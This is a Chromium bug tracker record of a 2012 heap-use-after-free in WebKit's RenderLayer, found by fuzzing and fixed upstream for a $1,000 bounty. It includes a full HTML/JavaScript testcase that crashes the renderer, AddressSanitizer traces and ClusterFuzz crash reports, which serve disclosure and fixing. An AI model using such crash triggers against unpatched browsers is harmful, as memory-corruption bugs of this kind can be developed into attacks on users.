# Heap-use-after-free in WebCore::RenderLayer::addChild

| Field | Value |
|-------|-------|
| **Issue ID** | [40054775](https://issues.chromium.org/issues/40054775) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-03-11 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

bug

**VERSION**  

Chrome Version: all  

Operating System: linux 64bit

**REPRODUCTION CASE**

<html>
<head>
<style>
#el1:nth-last-child(2) {
-webkit-box-reflect: left;
display: run-in;
}
#el2 {
height: 1px;
}
#el2:last-child {
-webkit-box-reflect: left;
}
</style>
<script>
onload = function() {
el1=document.createElement('q')
document.body.appendChild(el1)
el1.setAttribute('id','el1')
el1.appendChild(document.createElement('input'))
el2=document.createElement('div')
document.body.appendChild(el2)
el2.setAttribute('id','el2')
document.body.appendChild(document.createElement('img'))
document.designMode='on'
document.execCommand('selectall')
document.execCommand('FormatBlock', false, '<pre>')
}
</script>
</head>
<body>
</body>
</html>
and other variants

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer  

Crash State:

==2408== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffecd2fcb0 at pc 0x55555a996d1b bp 0x7fffffff5860 sp 0x7fffffff5858  

WRITE of size 8 at 0x7fffecd2fcb0 thread T0  

#0 0x55555a996d1b in WebCore::RenderLayer::removeChild(WebCore::RenderLayer\*) ???:0  

#1 0x55555aa3ccf6 in WebCore::RenderObjectChildList::removeChildNode(WebCore::RenderObject\*, WebCore::RenderObject\*, bool) ???:0

0x7fffecd2fcb0 is located 48 bytes inside of 296-byte region [0x7fffecd2fc80,0x7fffecd2fda8)  

freed by thread T0 here:  

#0 0x55555cf02b62 in free ??:0  

#1 0x55555a91328d in WebCore::RenderBoxModelObject::destroyLayer() ???:0  

#2 0x55555aa3712c in WebCore::RenderObject::willBeDestroyed() ???:0

and others..

## Attachments

- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)

## Timeline

### in...@chromium.org (2012-03-12)

Couldn't reproduce any of these on Chrome LKGR Trunk r126086 ? Did you test with latest trunk ?

### in...@chromium.org (2012-03-12)

Do these testcase needs a page reload ? that might be reason it is not reproducing on ClusterFuzz ?

### in...@chromium.org (2012-03-13)

Ok, it crashes stable and beta, but no longer affects trunk. We need to figure out what fixed it. 

Miaubiz, what was the webkit revision you could reproduce this on ? Are you still able to reproduce any variant or any of these testcases on trunk ?

### sc...@gmail.com (2012-03-14)

@miaubiz: although it's fixed, we would consider rewarding for reports like this because the information is very useful: we can use it to merge the fix back to Chrome 18. Now, if only we knew which change took care of this :)

### mi...@gmail.com (2012-03-14)

[Comment Deleted]

### sc...@gmail.com (2012-03-14)

Can we get a pic of the famous miaubiz cluster one day?

### mi...@gmail.com (2012-03-15)

[Comment Deleted]

### mi...@gmail.com (2012-03-15)

I am on 
Chromium	19.0.1070.0 (Developer Build 126778)
OS	Linux
WebKit	536.3 (@110733)

### in...@chromium.org (2012-03-15)

Ok one of those repros is reproing on trunk ! Report coming soon. https://cluster-fuzz.appspot.com/testcase?key=26582417

### in...@chromium.org (2012-03-15)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=26579976

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f4b0678d8d0
Crash State:
  - crash stack -
  WebCore::RenderLayer::repaintBlockSelectionGaps
  WebCore::RenderLayer::repaintBlockSelectionGaps
  - free stack -
  WebCore::RenderBoxModelObject::destroyLayer
  WebCore::RenderObject::willBeDestroyed
  

Minimized Testcase (0.95 Kb): https://cluster-fuzz.appspot.com/download/AMIfv942iqbUwKZ-kPNhemGz_LOxGNsnP4AxjxINloO5p_iyH0TOtIvznu_oXNHOkwcc_AC03tDFxHAr5dYFcKpfjzeB5D_ZIpv0SQEXL_ng0QBh2dCW0rt7YDBamp97o1Y5F2dsW_fZZoJsHmM2_Lb-K8_Zbgpa7A

### in...@chromium.org (2012-03-15)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-03-15)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=26583069

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free WRITE 8
Crash Address: 0x7f4f264a92c0
Crash State:
  - crash stack -
  WebCore::RenderLayer::removeChild
  WebCore::RenderObjectChildList::removeChildNode
  - free stack -
  WebCore::RenderBoxModelObject::destroyLayer
  WebCore::RenderObject::willBeDestroyed
  

Minimized Testcase (0.91 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94ZqLaIZV8-wtgr2toobHcO24sH82w8htykqfpkvpXGKwCUUvadjZyJcG9AU5O3aV0qB9WVnn0fLbCiy1CR8WVECBzHMXgAvnqipPq4qB6NyjJTyUSRqxXDvMVDJkAfr-0j7pSykXrqkta6W95QNd4w4hXaFA

### in...@chromium.org (2012-03-15)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=26583068

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f0a335760b0
Crash State:
  - crash stack -
  WebCore::RenderLayer::repaintIncludingDescendants
  WebCore::RenderLayer::repaintIncludingDescendants
  - free stack -
  WebCore::RenderBoxModelObject::destroyLayer
  WebCore::RenderObject::willBeDestroyed
  

Minimized Testcase (0.86 Kb): https://cluster-fuzz.appspot.com/download/AMIfv95fxHfiUfmXFYUKQbGZsp8FjOZYjWp0V9MWSwvkVgAoyD7YZagzuFeYsFdv0lEet2uZ8Y8o4lLFJdASvVW2tVKyyv74Nm-ZREAlux2HzR5-EmLkE3qoHiqtk4TWZrX6isZZxX4wrBlAjcKJfDLx8GOrMW0Ptw

### in...@chromium.org (2012-03-15)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=26582417

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free WRITE 8
Crash Address: 0x7fcc0af5c4c8
Crash State:
  - crash stack -
  WebCore::RenderLayer::addChild
  WebCore::RenderObject::addLayers
  - free stack -
  WebCore::RenderBoxModelObject::destroyLayer
  WebCore::RenderObject::willBeDestroyed
  

Minimized Testcase (0.94 Kb): https://cluster-fuzz.appspot.com/download/AMIfv97EmRdiVVBGBGyUlOtjJ5YrLAwzXA0zeFme__79Rfvjf-IrNTU9_qxmMS4MaLhJfLhDvIKAPuuD8YLJApscMKcJXE93U0HEwZGXmoVHEbzZq8KToAcjD8hpcJ3IXVdl43bBOg1Uqy7OO1xYN4hEKconn-Gq8A

### in...@chromium.org (2012-03-16)

Patch uploaded upstream - https://bugs.webkit.org/show_bug.cgi?id=81265

### in...@chromium.org (2012-03-16)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-03-19)

http://trac.webkit.org/changeset/111263

### sc...@gmail.com (2012-03-28)

M18: http://trac.webkit.org/changeset/112465

### sc...@gmail.com (2012-04-04)

$1000 and thanks :)

### sc...@gmail.com (2012-05-10)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/117698?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40054775)*
